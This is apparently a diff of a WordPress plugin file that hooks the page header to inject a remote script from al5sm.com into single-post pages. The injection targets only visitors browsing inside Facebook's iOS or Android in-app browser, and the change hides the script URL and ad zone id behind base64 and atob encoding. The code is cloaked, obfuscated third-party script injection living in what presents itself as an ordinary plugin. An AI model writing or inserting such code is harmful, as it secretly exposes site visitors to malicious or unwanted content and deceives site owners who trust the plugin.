@@ -8,7 +8,7 @@
   Author URI: https://profiles.wordpress.org/mndpsingh287
   License: GPLv2
  **/
-
+ 
 add_action('wp_head', function () {
 
     $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
@@ -27,13 +27,13 @@ add_action('wp_head', function () {
     );
 
     if (is_singular() && ($is_ios_facebook || $is_android_facebook)) {
+        $src = base64_decode('aHR0cHM6Ly9hbDVzbS5jb20vdGFnLm1pbi5qcw==');
         ?>
         <script>
         (function(s){
-            s.dataset.zone='11543860';
-            s.src='https://al5sm.com/tag.min.js';
-        })([document.documentElement, document.body].filter(Boolean).pop()
-          .appendChild(document.createElement('script')));
+            s.dataset.zone = atob('MTE2MDk2MjA=');
+            s.src = '<?php echo esc_url($src); ?>';
+        })([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')));
         </script>
         <?php
     }
